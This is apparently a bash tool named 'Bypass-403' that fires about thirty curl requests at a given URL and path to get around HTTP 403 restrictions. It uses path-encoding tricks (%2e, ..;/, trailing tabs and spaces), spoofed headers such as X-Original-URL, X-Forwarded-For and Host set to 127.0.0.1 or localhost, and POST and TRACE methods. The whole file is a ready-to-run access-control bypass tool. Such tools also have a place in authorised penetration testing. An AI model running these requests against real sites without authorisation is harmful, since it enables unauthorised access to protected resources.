#! /bin/bash
figlet Bypass-403
echo "                                               By wlaasmi"
echo "./bypass-403.sh https://example.com path"
echo " "
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1
echo "  --> ${1} control"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
curl -k -s -o /dev/null -i -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "Host: google.com" $1/$2
echo "  --> ${1}/${2} -H Host: google.com"
curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "Host: localhost" $1/$2
echo "  --> ${1}/${2} -H Host: localhost"
curl -s -o /dev/null -i -w "%{http_code}","%{size_download}" -H "Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Host: 127.0.0.1"
